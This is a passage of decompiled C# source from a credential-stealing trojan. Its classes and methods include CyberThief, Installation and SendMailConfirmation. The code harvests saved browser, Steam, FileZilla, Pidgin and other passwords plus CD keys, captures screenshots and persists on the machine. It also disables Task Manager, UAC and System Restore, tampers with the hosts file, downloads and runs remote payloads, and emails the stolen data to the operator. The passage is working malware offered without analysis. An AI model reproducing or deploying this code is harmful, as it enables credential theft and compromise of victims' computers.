    {
      int num = 0;
      int location = 1;
      while (location < s.Length)
      {
        if (location % 2 != 0)
          checked { num += Convert.ToInt32(Conversion.Val("&H" + Strings.Mid(s, location, 2))); }
        Math.Max(Interlocked.Increment(ref location), checked (location - 1));
      }
      return Convert.ToByte(num % 256);
    }

    public void DecryptCredential(string sURL, string sHash, int Length, byte[] data)
    {
      CyberThief.DATA_BLOB pDataIn = new CyberThief.DATA_BLOB();
      CyberThief.DATA_BLOB pDataOut = new CyberThief.DATA_BLOB();
      CyberThief.DATA_BLOB pOptionalEntropy = new CyberThief.DATA_BLOB();
      CyberThief.StringIndexHeader stringIndexHeader = new CyberThief.StringIndexHeader();
      CyberThief.StringIndexEntry structure1 = new CyberThief.StringIndexEntry();
      IntPtr destination = Marshal.AllocHGlobal(Length);
      Marshal.Copy(data, 0, destination, Length);
      pDataIn.cbData = Length;
      pDataIn.pbData = destination;
      pOptionalEntropy.cbData = checked (sURL.Length + 1 * 2);
      pOptionalEntropy.pbData = CyberThief.VarPtr((object) sURL);
      if (!CyberThief.CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut))
        return;
      IntPtr ptr1 = new IntPtr(checked (pDataOut.pbData.ToInt32() + (int) Marshal.ReadByte(pDataOut.pbData)));
      CyberThief.StringIndexHeader structure2 = (CyberThief.StringIndexHeader) Marshal.PtrToStructure(ptr1, stringIndexHeader.GetType());
      if (structure2.dwType != 1 || structure2.dwEntriesCount < 2)
        return;
      IntPtr ptr2 = new IntPtr(checked (ptr1.ToInt32() + structure2.dwStructSize));
      IntPtr num = new IntPtr(checked (ptr2.ToInt32() + (structure2.dwEntriesCount + 0) * Marshal.SizeOf((object) structure1)));
      int location = 0;
      while ((double) location < (double) structure2.dwEntriesCount / 2.0)
      {
        if (location != 0)
          ptr2 = new IntPtr(checked (ptr2.ToInt32() + Marshal.SizeOf((object) structure1)));
        CyberThief.StringIndexEntry structure3 = (CyberThief.StringIndexEntry) Marshal.PtrToStructure(ptr2, structure1.GetType());
        IntPtr ptr3 = new IntPtr(checked (num.ToInt32() + structure3.dwDataOffset));
        string stringAuto1 = Marshal.PtrToStringAuto(ptr3);
        ptr2 = new IntPtr(checked (ptr2.ToInt32() + Marshal.SizeOf((object) structure3)));
        structure1 = (CyberThief.StringIndexEntry) Marshal.PtrToStructure(ptr2, structure3.GetType());
        ptr3 = new IntPtr(checked (num.ToInt32() + structure1.dwDataOffset));
        string stringAuto2 = Marshal.PtrToStringAuto(ptr3);
        this.IEPassHolder = this.IEPassHolder + "URL: " + sURL;
        this.IEPassHolder += "\r\n";
        this.IEPassHolder = this.IEPassHolder + "Username: " + stringAuto1;
        this.IEPassHolder += "\r\n";
        this.IEPassHolder = this.IEPassHolder + "Password: " + stringAuto2;
        this.IEPassHolder += "\r\n";
        this.IEPassHolder += "\r\n";
        Math.Max(Interlocked.Increment(ref location), checked (location - 1));
      }
    }

    public static IntPtr VarPtr(object o) => GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject();

    public static string Right(string param, int length) => param.Substring(checked (param.Length - length), length);

    public static string Mid(string param, int startIndex, int length) => param.Substring(startIndex, length);

    public void Installation()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.CheckFakeNameApp();
label_2:
        num3 = 3;
        this.WriteMutexToReg();
label_3:
        num3 = 4;
        this.ProductKey = this.GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
label_4:
        num3 = 5;
        if (!this.MeltFile)
          goto label_6;
label_5:
        num3 = 6;
        this.MeltExecute();
label_6:
        num3 = 8;
        if (!this.AntiHeavenCheck)
          goto label_8;
label_7:
        num3 = 9;
        this.GetRidOfScrambler();
label_8:
        num3 = 11;
        if (!this.DoIInstall)
          goto label_13;
label_9:
        num3 = 12;
        this.CreateDirectory();
label_10:
        num3 = 13;
        this.MyApplicationName = this.NameOnlyFromFullPath(Application.ExecutablePath);
label_11:
        num3 = 14;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.TheGodPath, UIOption.OnlyErrorDialogs, UICancelOption.DoNothing);
label_12:
        num3 = 15;
        this.ExeAttributes();
label_13:
        num3 = 17;
        if (!this.DoIStartup)
          goto label_15;
label_14:
        num3 = 18;
        this.RegistryInformationCheck();
label_15:
        num3 = 20;
        if (!(this.DoIStartup & this.DoIActiveX))
          goto label_17;
label_16:
        num3 = 21;
        this.CreateActiveX();
label_17:
        num3 = 23;
        if (!this.HiddenFile)
          goto label_19;
label_18:
        num3 = 24;
        this.hidefolder();
label_19:
        num3 = 26;
        if (!this.HideFileExtension)
          goto label_21;
label_20:
        num3 = 27;
        this.HideFileExt();
label_21:
        num3 = 29;
        if (!this.DisableSystemRestore)
          goto label_23;
label_22:
        num3 = 30;
        this.DisableSR();
label_23:
        num3 = 32;
        if (!this.DoIInstall)
          goto label_25;
label_24:
        num3 = 33;
        Process.Start(this.TheGodPath);
label_25:
        num3 = 35;
        this.MSNInfo = this.ThatThingCalledMessanger();
label_26:
        num3 = 36;
        this.GetIEPasswords();
label_27:
        num3 = 37;
        this.ExplorerPass = "[---Internet Explorer 7/8 Stealer---]: \r\n===============================================\r\n" + this.IEPassHolder + "\r\n===============================================";
label_28:
        num3 = 38;
        this.FFStealer();
label_29:
        num3 = 39;
        this.IMVU = this.DoToVu();
label_30:
        num3 = 40;
        this.Pidgin = mPidginNETRecovery.GetPidgin();
label_31:
        num3 = 41;
        this.SteamUsername = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) "[---Steam Username Stealer---]: \r\n===============================================\r\nUsername(s): ", this.GetSteamUsername()), (object) "\r\n"), (object) "==============================================="));
label_32:
        num3 = 42;
        CDKeyStealer.LeseKeys();
label_33:
        num3 = 43;
        CDKeyStealer.NewCDStealer();
label_34:
        num3 = 44;
        this.NoIpSteal();
label_35:
        num3 = 45;
        this.GetIPAddresses();
label_36:
        num3 = 46;
        this.FileZillaPasswords = mFileZillaNETRecovery.GetFileZilla();
label_37:
        num3 = 47;
        this.ProductKey = this.GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
label_38:
        num3 = 48;
        this.CDKeys = MyProject.Computer.FileSystem.ReadAllText(Path.GetTempPath() + "\\cdinformation.txt");
label_39:
        num3 = 49;
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
label_40:
        num3 = 50;
        Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
label_41:
        num3 = 51;
        Graphics graphics = Graphics.FromImage((Image) bitmap);
label_42:
        num3 = 52;
        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
label_43:
        num3 = 53;
        this.PictureBox1.Image = (Image) bitmap;
label_44:
        num3 = 54;
        this.PictureBox1.Image.Save(Path.GetTempPath() + "\\StartupImage.jpeg", ImageFormat.Jpeg);
label_45:
        num3 = 55;
        if (!this.UseSMTP)
          goto label_47;
label_46:
        num3 = 56;
        this.SendMailConfirmation();
label_47:
        num3 = 58;
        if (!this.UseFTP)
          goto label_49;
label_48:
        num3 = 59;
        this.FTPConfirmationSend();
label_49:
        num3 = 61;
        if (!this.WebsiteBlocker)
          goto label_51;
label_50:
        num3 = 62;
        this.WebsiteBlockerFunct();
label_51:
        num3 = 64;
        if (!this.ClearSteam)
          goto label_55;
label_52:
        num3 = 65;
        RegistryKey registryKey = MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam\\", true);
label_53:
        num3 = 66;
        registryKey.SetValue("RefreshLoginRequired", (object) 1);
label_54:
        num3 = 67;
        registryKey.Close();
label_55:
        num3 = 69;
        if (!this.CloseSteam)
          goto label_62;
label_56:
        num3 = 70;
        Process[] processesByName = Process.GetProcessesByName("steam");
label_57:
        num3 = 71;
        Process[] processArray = processesByName;
        int index = 0;
        goto label_61;
label_59:
        num3 = 72;
        Process process;
        process.Kill();
        checked { ++index; }
label_60:
        num3 = 73;
label_61:
        if (index < processArray.Length)
        {
          process = processArray[index];
          goto label_59;
        }
label_62:
        num3 = 75;
        if (!this.RemoteDownload)
          goto label_65;
label_63:
        num3 = 76;
        MyProject.Computer.Network.DownloadFile(this.DownloadURL, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.DownloadName);
label_64:
        num3 = 77;
        Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.DownloadName, AppWinStyle.NormalNoFocus);
label_65:
        num3 = 79;
        MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Windows Update.exe");
label_66:
        num3 = 80;
        MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\melt.txt");
label_67:
        num3 = 81;
        MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\winnet.exe");
label_68:
        num3 = 82;
        MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\56352211.txt");
label_69:
        num3 = 83;
        if (!this.DisableTM)
          goto label_71;
label_70:
        num3 = 84;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
label_71:
        num3 = 86;
        if (!this.DisableUAC)
          goto label_73;
label_72:
        num3 = 87;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) "0", RegistryValueKind.DWord);
label_73:
        num3 = 89;
        if (!this.DisableReg)
          goto label_75;
label_74:
        num3 = 90;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
label_75:
        num3 = 92;
        if (!this.DoIInstall)
          goto label_77;
label_76:
        num3 = 93;
        // ISSUE: explicit finalizer call
        this.Finalize();
        ProjectData.EndApp();
        goto label_86;
label_77:
        num3 = 96;
label_78:
        num3 = 97;
        if (!this.DoIKeylog)
        {
          ProjectData.EndApp();
          goto label_86;
        }
        else
          goto label_86;
label_81:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
              case 11:
                goto label_8;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
              case 17:
                goto label_13;
              case 18:
                goto label_14;
              case 19:
              case 20:
                goto label_15;
              case 21:
                goto label_16;
              case 22:
              case 23:
                goto label_17;
              case 24:
                goto label_18;
              case 25:
              case 26:
                goto label_19;
              case 27:
                goto label_20;
              case 28:
              case 29:
                goto label_21;
              case 30:
                goto label_22;
              case 31:
              case 32:
                goto label_23;
              case 33:
                goto label_24;
              case 34:
              case 35:
                goto label_25;
              case 36:
                goto label_26;
              case 37:
                goto label_27;
              case 38:
                goto label_28;
              case 39:
                goto label_29;
              case 40:
                goto label_30;
              case 41:
                goto label_31;
              case 42:
                goto label_32;
              case 43:
                goto label_33;
              case 44:
                goto label_34;
              case 45:
                goto label_35;
              case 46:
                goto label_36;
              case 47:
                goto label_37;
              case 48:
                goto label_38;
              case 49:
                goto label_39;
              case 50:
                goto label_40;
              case 51:
                goto label_41;
              case 52:
                goto label_42;
              case 53:
                goto label_43;
              case 54:
                goto label_44;
              case 55:
                goto label_45;
              case 56:
                goto label_46;
              case 57:
              case 58:
                goto label_47;
              case 59:
                goto label_48;
              case 60:
              case 61:
                goto label_49;
              case 62:
                goto label_50;
              case 63:
              case 64:
                goto label_51;
              case 65:
                goto label_52;
              case 66:
                goto label_53;
              case 67:
                goto label_54;
              case 68:
              case 69:
                goto label_55;
              case 70:
                goto label_56;
              case 71:
                goto label_57;
              case 72:
                goto label_59;
              case 73:
                goto label_60;
              case 74:
              case 75:
                goto label_62;
              case 76:
                goto label_63;
              case 77:
                goto label_64;
              case 78:
              case 79:
                goto label_65;
              case 80:
                goto label_66;
              case 81:
                goto label_67;
              case 82:
                goto label_68;
              case 83:
                goto label_69;
              case 84:
                goto label_70;
              case 85:
              case 86:
                goto label_71;
              case 87:
                goto label_72;
              case 88:
              case 89:
                goto label_73;
              case 90:
                goto label_74;
              case 91:
              case 92:
                goto label_75;
              case 93:
                goto label_76;
              case 94:
              case 95:
              case 98:
              case 99:
              case 100:
              case 101:
              case 102:
                goto label_86;
              case 96:
                goto label_77;
              case 97:
                goto label_78;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_81;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_86:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public object GetSteamUsername()
    {
label_0:
      int num1;
      object obj;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string str = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "SteamPath", (object) ""));
label_2:
        num3 = 3;
        string file = str + "\\config\\SteamAppData.vdf";
label_3:
        num3 = 4;
        string[] strArray = MyProject.Computer.FileSystem.ReadAllText(file).Split('"');
label_4:
        num3 = 5;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(strArray[9], "", false) == 0)
          goto label_7;
label_5:
        num3 = 6;
        strArray[9] = strArray[9];
label_6:
        num3 = 7;
        obj = (object) strArray[9];
        goto label_15;
label_7:
        num3 = 9;
label_8:
        obj = (object) null;
        goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
              case 11:
              case 12:
                goto label_15;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      object steamUsername = obj;
      if (num2 == 0)
        return steamUsername;
      ProjectData.ClearProjectError();
      return steamUsername;
    }

    public void BotKill()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        byte[] scanner = Windows_Explorer.My.Resources.Resources.Scanner;
label_2:
        num3 = 3;
        string folderPath = Environment.GetFolderPath((Environment.SpecialFolder) Conversions.ToInteger(Path.GetTempPath()));
label_3:
        num3 = 4;
        FileStream fileStream = System.IO.File.Create(folderPath + "\\svchost.exe");
label_4:
        num3 = 5;
        fileStream.Write(scanner, 0, scanner.Length);
label_5:
        num3 = 6;
        fileStream.Close();
label_6:
        num3 = 7;
        Interaction.Shell(folderPath + "\\svchost.exe", AppWinStyle.Hide);
label_7:
        num3 = 8;
        Thread.Sleep(1700);
label_8:
        num3 = 9;
        MyProject.Computer.FileSystem.DeleteFile(folderPath + "\\svchost.exe");
        goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void WebsiteBlockerFunct()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        StreamReader streamReader = new StreamReader("C:/windows/system32/drivers/etc/hosts");
label_2:
        num3 = 3;
        string end = streamReader.ReadToEnd();
label_3:
        num3 = 4;
        streamReader.Dispose();
label_4:
        num3 = 5;
        streamReader.Close();
label_5:
        num3 = 6;
        StreamWriter streamWriter = new StreamWriter("C:/windows/system32/drivers/etc/hosts");
label_6:
        num3 = 7;
        streamWriter.WriteLine(end);
label_7:
        num3 = 8;
        streamWriter.WriteLine(this.WebsiteURLs);
label_8:
        num3 = 9;
        streamWriter.WriteLine();
label_9:
        num3 = 10;
        streamWriter.Flush();
label_10:
        num3 = 11;
        streamWriter.Close();
        goto label_17;
label_12:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
              case 13:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_17:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void KeylogOnlyInstallation()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.CheckFakeNameApp();
label_2:
        num3 = 3;
        this.WriteMutexToReg();
label_3:
        num3 = 4;
        this.ProductKey = this.GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
label_4:
        num3 = 5;
        if (!this.MeltFile)
          goto label_6;
label_5:
        num3 = 6;
        this.MeltExecute();
label_6:
        num3 = 8;
        if (!this.AntiHeavenCheck)
          goto label_8;
label_7:
        num3 = 9;
        this.GetRidOfScrambler();
label_8:
        num3 = 11;
        if (!this.DoIInstall)
          goto label_13;
label_9:
        num3 = 12;
        this.CreateDirectory();
label_10:
        num3 = 13;
        this.MyApplicationName = this.NameOnlyFromFullPath(Application.ExecutablePath);
label_11:
        num3 = 14;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.TheGodPath, UIOption.OnlyErrorDialogs, UICancelOption.DoNothing);
label_12:
        num3 = 15;
        this.ExeAttributes();
label_13:
        num3 = 17;
        if (!this.DoIStartup)
          goto label_15;
label_14:
        num3 = 18;
        this.RegistryInformationCheck();
label_15:
        num3 = 20;
        if (!(this.DoIStartup & this.DoIActiveX))
          goto label_17;
label_16:
        num3 = 21;
        this.CreateActiveX();
label_17:
        num3 = 23;
        if (!this.HiddenFile)
          goto label_19;
label_18:
        num3 = 24;
        this.hidefolder();
label_19:
        num3 = 26;
        if (!this.HideFileExtension)
          goto label_21;
label_20:
        num3 = 27;
        this.HideFileExt();
label_21:
        num3 = 29;
        if (!this.DisableSystemRestore)
          goto label_23;
label_22:
        num3 = 30;
        this.DisableSR();
label_23:
        num3 = 32;
        if (!this.DoIInstall)
          goto label_25;
label_24:
        num3 = 33;
        Process.Start(this.TheGodPath);
label_25:
        num3 = 35;
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
label_26:
        num3 = 36;
        Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
label_27:
        num3 = 37;
        Graphics graphics = Graphics.FromImage((Image) bitmap);
label_28:
        num3 = 38;
        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
label_29:
        num3 = 39;
        this.PictureBox1.Image = (Image) bitmap;
label_30:
        num3 = 40;
        this.PictureBox1.Image.Save(Path.GetTempPath() + "\\StartupImage.jpeg", ImageFormat.Jpeg);
label_31:
        num3 = 41;
        if (!this.UseSMTP)
          goto label_33;
label_32:
        num3 = 42;
        this.KeylogOnlySendMailConfirmation();
label_33:
        num3 = 44;
        if (!this.UseFTP)
          goto label_35;
label_34:
        num3 = 45;
        this.FTPConfirmationSend();
label_35:
        num3 = 47;
        if (!this.WebsiteBlocker)
          goto label_37;
label_36:
        num3 = 48;
        this.WebsiteBlockerFunct();
label_37:
        num3 = 50;
        if (!this.ClearSteam)
          goto label_41;
label_38:
        num3 = 51;
        RegistryKey registryKey = MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam\\", true);
label_39:
        num3 = 52;
        registryKey.SetValue("RefreshLoginRequired", (object) 1);
label_40:
        num3 = 53;
        registryKey.Close();
label_41:
        num3 = 55;
        if (!this.CloseSteam)
          goto label_48;
label_42:
        num3 = 56;
        Process[] processesByName = Process.GetProcessesByName("steam");
label_43:
        num3 = 57;
        Process[] processArray = processesByName;
        int index = 0;
        goto label_47;
label_45:
        num3 = 58;
        Process process;
        process.Kill();
        checked { ++index; }
label_46:
        num3 = 59;
label_47:
        if (index < processArray.Length)
        {
          process = processArray[index];
          goto label_45;
        }
label_48:
        num3 = 61;
        if (!this.DisableTM)
          goto label_50;
label_49:
        num3 = 62;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
label_50:
        num3 = 64;
        if (!this.DisableUAC)
          goto label_52;
label_51:
        num3 = 65;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) "0", RegistryValueKind.DWord);
label_52:
        num3 = 67;
        if (!this.DisableReg)
          goto label_54;
label_53:
        num3 = 68;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
label_54:
        num3 = 70;
        MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Windows Update.exe");
label_55:
        num3 = 71;
        if (!this.DoIInstall)
          goto label_57;
label_56:
        num3 = 72;
        // ISSUE: explicit finalizer call
        this.Finalize();
        ProjectData.EndApp();
        goto label_66;
label_57:
        num3 = 75;
label_58:
        num3 = 76;
        if (!this.DoIKeylog)
        {
          ProjectData.EndApp();
          goto label_66;
        }
        else
          goto label_66;
label_61:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
              case 11:
                goto label_8;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
              case 17:
                goto label_13;
              case 18:
                goto label_14;
              case 19:
              case 20:
                goto label_15;
              case 21:
                goto label_16;
              case 22:
              case 23:
                goto label_17;
              case 24:
                goto label_18;
              case 25:
              case 26:
                goto label_19;
              case 27:
                goto label_20;
              case 28:
              case 29:
                goto label_21;
              case 30:
                goto label_22;
              case 31:
              case 32:
                goto label_23;
              case 33:
                goto label_24;
              case 34:
              case 35:
                goto label_25;
              case 36:
                goto label_26;
              case 37:
                goto label_27;
              case 38:
                goto label_28;
              case 39:
                goto label_29;
              case 40:
                goto label_30;
              case 41:
                goto label_31;
              case 42:
                goto label_32;
              case 43:
              case 44:
                goto label_33;
              case 45:
                goto label_34;
              case 46:
              case 47:
                goto label_35;
              case 48:
                goto label_36;
              case 49:
              case 50:
                goto label_37;
              case 51:
                goto label_38;
              case 52:
                goto label_39;
              case 53:
                goto label_40;
              case 54:
              case 55:
                goto label_41;
              case 56:
                goto label_42;
              case 57:
                goto label_43;
              case 58:
                goto label_45;
              case 59:
                goto label_46;
              case 60:
              case 61:
                goto label_48;
              case 62:
                goto label_49;
              case 63:
              case 64:
                goto label_50;
              case 65:
                goto label_51;
              case 66:
              case 67:
                goto label_52;
              case 68:
                goto label_53;
              case 69:
              case 70:
                goto label_54;
              case 71:
                goto label_55;
              case 72:
                goto label_56;
              case 73:
              case 74:
              case 77:
              case 78:
              case 79:
              case 80:
              case 81:
                goto label_66;
              case 75:
                goto label_57;
              case 76:
                goto label_58;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_61;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_66:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void KeylogOnlySendMailConfirmation()
    {
      try
      {
        Attachment attachment = new Attachment(Path.GetTempPath() + "\\StartupImage.jpeg");
        MailMessage message = new MailMessage();
        message.From = new MailAddress(this.Email);
        message.To.Add(this.EmailTo);
        message.Subject = "The Bypass has been activated on " + Environment.MachineName.ToString() + " by the user " + Environment.UserName.ToString() + " at " + DateAndTime.Now.ToLongTimeString();
        message.Body = "OS Serial Key: " + this.ProductKey + "\r\nThe Stealers have been disabled.";
        if (this.SendScreenshots)
          message.Attachments.Add(attachment);
        new SmtpClient(this.SMTPServer)
        {
          Port = Conversions.ToInteger(this.SMTPPort),
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.Email, this.Password))
        }.Send(message);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void SendMailConfirmation()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Attachment attachment1 = new Attachment(Path.GetTempPath() + "\\StartupImage.jpeg");
label_2:
        num3 = 3;
        Attachment attachment2 = new Attachment(Path.GetTempPath() + "\\cdinformation.txt");
label_3:
        num3 = 4;
        MailMessage message = new MailMessage();
label_4:
        num3 = 5;
        message.From = new MailAddress(this.Email);
label_5:
        num3 = 6;
        message.To.Add(this.EmailTo);
label_6:
        num3 = 7;
        message.Subject = "The Bypass has been activated on " + Environment.MachineName.ToString() + " by the user " + Environment.UserName.ToString() + " at " + DateAndTime.Now.ToLongTimeString();
label_7:
        num3 = 8;
        message.Body = "The attached notepad has a list of CD keys the user has, and all other captured information is listed bellow.\r\n\r\n[----System Information----]:\r\nOS Serial Key: " + this.ProductKey + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nComputer Name: " + Environment.MachineName + "\r\nWebcam Devices: N/A\r\n\r\nExternal IP Address: " + this.ExternalIP + "\r\nInternal IP Address: " + this.InternalIP + "\r\n\r\n\r\n" + this.FFPasswords + "\r\n===============================================\r\n\r\n[---Google Chrome Stealer---]:\r\n===============================================\r\n" + this.ChromePassword + "\r\n===============================================\r\n\r\n" + this.ExplorerPass + "\r\n\r\n\r\n[---MSN Messenger Stealer---]:\r\n===============================================\r\n" + this.MSNInfo + "\r\n===============================================\r\n\r\n" + this.SteamUsername + "\r\n\r\n[----No-Ip Stealer----]:\r\n===============================================\r\nUsername(s): " + this.Temp45 + "\r\nPassword(s): " + this.Temp46 + "\r\nHost(s): " + this.Temp47 + "\r\n===============================================\r\n\r\n[-----FileZila Stealer-----]:\r\n===============================================\r\n" + this.FileZillaPasswords + "===============================================\r\n\r\n[----DynDNS Stealer----]:\r\n===============================================\r\n" + this.DynDNS + "\r\n===============================================\r\n\r\n[---Pidgin Stealer---]:\r\n===============================================\r\n" + this.Pidgin + "\r\n===============================================\r\n\r\n[---IMVU Stealer---]:\r\n===============================================\r\n" + this.IMVU + "\r\n===============================================";
label_8:
        num3 = 9;
        if (!this.SendScreenshots)
          goto label_10;
label_9:
        num3 = 10;
        message.Attachments.Add(attachment1);
label_10:
        num3 = 12;
        message.Attachments.Add(attachment2);
label_11:
        num3 = 13;
        SmtpClient smtpClient = new SmtpClient(this.SMTPServer);
label_12:
        num3 = 14;
        smtpClient.Port = Conversions.ToInteger(this.SMTPPort);
label_13:
        num3 = 15;
        smtpClient.EnableSsl = true;
label_14:
        num3 = 16;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.Email, this.Password);
label_15:
        num3 = 17;
        smtpClient.Send(message);
        goto label_22;
label_17:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
